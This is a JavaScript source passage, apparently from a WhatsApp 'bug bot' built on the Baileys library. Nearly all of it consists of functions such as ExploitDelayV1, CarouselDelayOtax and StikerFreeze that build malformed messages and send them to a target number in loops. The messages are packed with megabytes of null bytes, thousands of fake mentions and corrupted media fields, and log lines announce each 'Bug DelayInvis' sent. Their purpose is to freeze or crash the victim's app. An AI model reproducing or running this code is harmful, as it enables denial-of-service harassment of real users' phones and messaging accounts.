                    nativeFlowResponseMessage: {
                        name: "menu_options",
                        paramsJson: '{"display_text":" WHAT???","id":".grockk","description":"AHH ENAKKKK"}',
                        version: "3"
                    }
                }
            }
        }
    }, {});

    const xwarku = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: " 유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유 ", format: "DEFAULT" },
                    nativeFlowResponseMessage: xwar.nativeFlowResponseMessage,
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const xwarpler = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                ephermalMessage: xwar.ephermalMessage,
                contextInfo: xwar.contextInfo,
                nativeFlowResponseMessage: xwar.nativeFlowResponseMessage
            }
        }
    }, {});

    const pushCard = {
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: " ",
            hasMediaAttachment: true,
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                fileLength: "18352",
                height: 720,
                width: 1280,
                mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1737281900",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyIiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                scanLengths: [3537, 10557, 1905, 2353],
                midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
            }
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
    };

    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                contextInfo: {
                    mentionedJid: mentionedJids,
                    statusAttributionType: "SHARED_FROM_MENTION",
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: newsletterJid,
                        serverMessageId: 1,
                        newsletterName: `유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유 ${"ꦾ".repeat(1900)}`,
                        contentType: 3,
                        accessibilityText: " Trevosium - 1st "
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    }
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.create({ text: " 유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유 " }),
                    header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [pushCard]
                    })
                })
            }
        }
    }, {});

    const broadcastConfig = {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    };

    for (let i = 0; i < 5; i++) {
        broadcastConfig.messageId = war.key.id;
        await sock.relayMessage("status@broadcast", war.message, broadcastConfig);

        broadcastConfig.messageId = xwarku.key.id;
        await sock.relayMessage("status@broadcast", xwarku.message, broadcastConfig);

        broadcastConfig.messageId = xwarpler.key.id;
        await sock.relayMessage("status@broadcast", xwarpler.message, broadcastConfig);

        broadcastConfig.messageId = msg.key.id;
        await sock.relayMessage("status@broadcast", msg.message, broadcastConfig);

        console.log(`Succes Sending Bug DelayInvis To ${target}`);

        if (i < 99) await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

async function newCatalog(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                orderMessage: {
                    orderId: "92828",
                    thumbnail: null,
                    itemCount: 9999999999999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: "\u0000".repeat(100000),
                    orderTitle: "\u0000".repeat(100000),
                    sellerJid: target,
                    token: "8282882828==",
                    totalAmount1000: "828828292727372728829",
                    totalCurrencyCode: "IDR",
                    messageVersion: 1,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 2000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}


async function ExploitDelayV1(sock, target) {
  for (let i = 0; i < 100; i++) {
    const push = [];
    const buttons = [];

    for (let j = 0; j < 50; j++) {
      buttons.push({
        name: 'galaxy_message',
        buttonParamsJson: JSON.stringify({
          header: 'null',
          body: 'xxx',
          flow_action: 'navigate',
          flow_action_payload: { screen: 'FORM_SCREEN' },
          flow_cta: 'Grattler',
          flow_id: '1169834181134583',
          flow_message_version: '3',
          flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
        }),
      });
    }

    for (let k = 0; k < 10; k++) {
      push.push({
        body: { text: '𖣂᳟᪳' },
        footer: { text: '' },
        header: {
          title: 'X ',
          hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mimetype: 'image/jpeg',
            fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
            fileLength: '591',
            height: 0,
            width: 0,
            mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
            fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
            directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mediaKeyTimestamp: '1721344123'
          },
        },
        nativeFlowMessage: { buttons },
      });
    }

    const synxtax = generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          body: { text: '\u0000' },
          footer: { text: "*" },
          synxtaxMessage: { cards: push },
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: synxtax.message } },
      {
        messageId: synxtax.key.id,
        participant: { jid: target },
      }
    );
  }
  let Msgx = {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `628${i + 72}@s.whatsapp.net`
        ),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          newsletterName: null,
          serverMessageId: 100,
          accessibilityText: null
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
      body: {
        text: null,
        format: null
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\x10".repeat(1000000),
        version: 3
      }
    }
  };

  let msg = generateWAMessageFromContent(
    target,
    { groupStatusMessageV2: { message: Msgx } },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  );

  await sock.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
    }
  });
}

async function DelaySpamLolipop(sock, target) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "\u0000".repeat(9000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"XTX\",\"city\":\"Medan\",\"name\":\"Sumatera Utara\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                isForwarded: true,
                forwardingScore: 7205,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363395010254840@newsletter",
                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
                    serverMessageId: 1000,
                    accessibilityText: "idk"
                },
                statusAttributionType: "RESHARED_FROM_MENTION",
                contactVcard: true,
                isSampled: true,
                dissapearingMode: {
                    initiator: target,
                    initiatedByMe: true
                },
                expiration: Date.now()
            },
        }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
        participant: { jid: target }
    });
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 1000; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

async function CarouselDelayOtax(sock, target) {
    console.log(chalk.red(`Succes Sending Bug DelayInvis To ${target}`));
    for (let i = 0; i < 2; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[",
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
   
    }
}

async function HardCore(sock, target) {
  let msg = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: { title: "ꦾ".repeat(8000) },
          body: { text: "ꦽ".repeat(8000) },
          contextInfo: {
            stanzaId: "button_id",
            isForwarding: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: ["13333335502@s.whatsapp.net", ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net")],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 18144000000,
              },
            },
            forwardedAiBotMessageInfo: {
              botName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
              botJid: Math.floor(Math.random() * 99999),
              creatorName: "https://t.me/Xavienzz",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  console.log(`Succes Sending Bug DelayInvis To ${target}`);
} 

async function audioXnxx(sock, target) {
  for (let i = 0; i < 15; i++) {
   const payload = {
    nativeFlowResponseMessage: {
      name: "call_permission_request",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
      entryPointConversionSource: "StatusMessage",
    },

    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: `#${Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "0")}`,

    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: Buffer.from([
        226, 213, 217, 102, 205, 126, 232, 145,
        0, 70, 137, 73, 190, 145, 0, 44,
        165, 102, 153, 233, 111, 114, 69, 10,
        55, 61, 186, 131, 245, 153, 93, 211,
      ]),
      fileLength: 432722,
      seconds: 26,
      ptt: false,
      mediaKey: Buffer.from([
        182, 141, 235, 167, 91, 254, 75, 254,
        190, 229, 25, 16, 78, 48, 98, 117,
        42, 71, 65, 199, 10, 164, 16, 57,
        189, 229, 54, 93, 69, 6, 212, 145,
      ]),
      fileEncSha256: Buffer.from([
        29, 27, 247, 158, 114, 50, 140, 73,
        40, 108, 77, 206, 2, 12, 84, 131,
        54, 42, 63, 11, 46, 208, 136, 131,
        224, 87, 18, 220, 254, 211, 83, 153,
      ]),
      directPath:
        "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1746275400,

      contextInfo: {
        mentionedJid: Array.from(
          { length: 1900 },
          () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
        ),
        isSampled: true,
        participant: target,
        remoteJid: "status@broadcast",
        forwardingScore: 9741,
        isForwarded: true,
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net",
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      ...payload,
      contextInfo: {
        ...payload.contextInfo,
        participant: "0@s.whatsapp.net",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          ),
        ],
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.red(`Succes Sending Bug DelayInvis To ${target}`))
  await sleep(2000);
  }
}

async function Xinvisdad(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
                    contentText:
                        "X",
                    footerText: "jid_menu",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "message_group" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "undefined" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function delaytriger(sock, target) {
  const TrigerMsg = "\u0003\u0003\u0003\u0003\u0003\u0003\u0003".repeat(150000);
    
  const delaymention = Array.from({ length: 50000 }, (_, r) => ({
    title: TrigerMsg,
    rows: Array(100).fill().map((_, i) => ({ 
      title: TrigerMsg,
      id: `${r + 1}_${i}`,
      description: TrigerMsg,
      subRows: Array(50).fill().map((_, j) => ({
        title: TrigerMsg,
        id: `${r + 1}_${i}_${j}`
      }))
    }))
  }));
  
  const contextInfo = {
    mentionedJid: [
      "0@s.whatsapp.net",
      ...Array.from({ length: 50000 }, () => 
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ],
    participant: target,
    remoteJid: "status@broadcast",
    forwardingScore: 9999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "333333333333@newsletter",
      serverMessageId: 999999,
      newsletterName: TrigerMsg
    },
    quotedMessage: {
      locationMessage: {
        degreesLatitude: -9.4882766288,
        degreesLongitude: 9.48827662899,
        name: TrigerMsg.repeat(10),
        address: TrigerMsg,
        url: null
      },
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 50000 }, () => 
            "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          )
        ],
        quotedMessage: {
          documentMessage: {
            title: TrigerMsg.repeat(5),
            fileLength: "999999999",
            jpegThumbnail: Buffer.alloc(1000000, 'binary').toString('base64')
          }
        }
      }
    }
  };

  const zunn = {
    locationMessage: {
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABQEDBAIGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzk9SclkpPXF+5iiyM2sklt0VsUww2IzVexT7ebhvSik1Cm1Q0G7HLrxdFdlQuxdrSswHScPkF2L6S5Cyj0uLSvEKrZkOTorkAnQB6pYAk4AgA/8QAJRAAAgICAgICAQUAAAAAAAAAAQIAAwQREiEQMXETFCAiMlJx/9oACAEBAAE/AJqcZ3EcejHRdcoTBD41AJxgWEbXUZdHqDUPhKS46ENbIex4pwb7ByCyypqyVYaM46acDCpEC7mMCQVE466ddyrC3YP6ytQiAAT5KlmsUqs/DIBLGPRpSRHXYinqYj8WMRlaVqEUdQeo4B9y019ncu4rUW37nUVyJgIb7fRAiJRT/HtpU2/fh9aOzqXWYwJBtmfYnFVRtiLYy+MLJUp9ajUDHcwbftyLSD0PGQdKZ8giaVx0TCfNVprIIlucXTSjU+FfQeFplHoiZT83/wA/VRfZSf2mU5aGlSXmZkr3poTD4//EABwRAAICAgMAAAAAAAAAAAAAAAEQABEgIQISQf/aAAgBAgEBPwBDYfhXEzUIlisOzOJf/8QAGREAAgMBAAAAAAAAAAAAAAAAAREAECAw/9oACAEDAQE/ANkU4sLn/9k=",
      degreesLatitude: 0,
      degreesLongitude: 0,
    },
    hasMediaAttachment: true,
    body: {
      text: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유" + "\u0000".repeat(10000),
    },
    footer: {
      text: " 유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유 ",
    },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(8888),
      buttons: [
        {
          name: "single_select",
          buttonParamsJson: `{"title":"\0${"\u0018".repeat(1000)}","sections":[{"title":"trevosium","rows":[]}]}`
        },
        {
          name: "form_message",
          buttonParamsJson: "\u0000".repeat(299999),
        },
      ],
    },
    carouselMessage: {
      cards: [],
    },
  };

  const messages = [
  ];

  for (const msg of messages) {
    try {
      await sock.relayMessage("status@broadcast", msg, {
        participant: { jid: target }
      });
    } catch (error) {
      console.error("Error sending message:", error);
    }
  }
}

//=====( Blank Android )=====\\

async function StikerFreeze(target) {
  try {
    if (!sock || typeof sock.relayMessage !== 'function') {
      throw new Error('sock belum terhubung atau tidak valid');
    }
    if (!target) {
      throw new Error('target (jid) harus diberikan');
    }

    const msg = {
      stickerPackMessage: {
        stickerPackId: "72de8e77-5320-4c69-8eba-ea2d274c5f12",
        name: "🩸⃟༑⃰The Trevosiumཀ‌‌🦠" + "𑆵𑆵𑆴𑆿𑆴𑆿".repeat(15700),
        publisher: "𑆵𑆵𑆴𑆿𑆴𑆿".repeat(10000),
        stickers: [
          {
            fileName: "r6ET0PxYVH+tMk4DOBH2MQYzbTiMFL5tMkMHDWyDOBs=.webp",
            isAnimated: true,
            accessibilityLabel: "bokep",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "99999999",
        fileSha256: "+tCLIfRSesicXnxE6YwzaAdjoP0BBfcLsDfCE0fFRls=",
        fileEncSha256: "PJ4lASN6j8g+gRxUEbiS3EahpLhw5CHREJoRQ1h9UKQ=",
        mediaKey: "kX3W6i35rQuRmOtVi6TARgbAm26VxyCszn5FZNRWroA=",
        directPath: "/v/t62.15575-24/29608676_1861690974374158_673292075744536110_n.enc",
        mediaKeyTimestamp: "1740922864",
        trayIconFileName: "72de8e77-5320-4c69-8eba-ea2d274c5f12.png",
        thumbnailDirectPath: "/v/t62.15575-24/35367658_2063226594091338_6819474368058812341_n.enc",
        thumbnailSha256: "SxHLg3uT9EgRH2wLlqcwZ8M6WCgCfwZuelX44J/Cb/M=",
        thumbnailEncSha256: "EMFLq0BolDqoRLkjRs9kIrF8yRiO+4kNl4PazUKc8gk=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "MjEyOGU2ZWM3NWFjZWRiYjNiNjczMzFiZGRhZjBlYmM1MDI3YTM0ZWFjNTRlMTg4ZjRlZjRlMWRjZGVmYTc1Zg==",
        stickerPackSize: "9999999999",
        stickerPackOrigin: "USER_CREATED"
      }
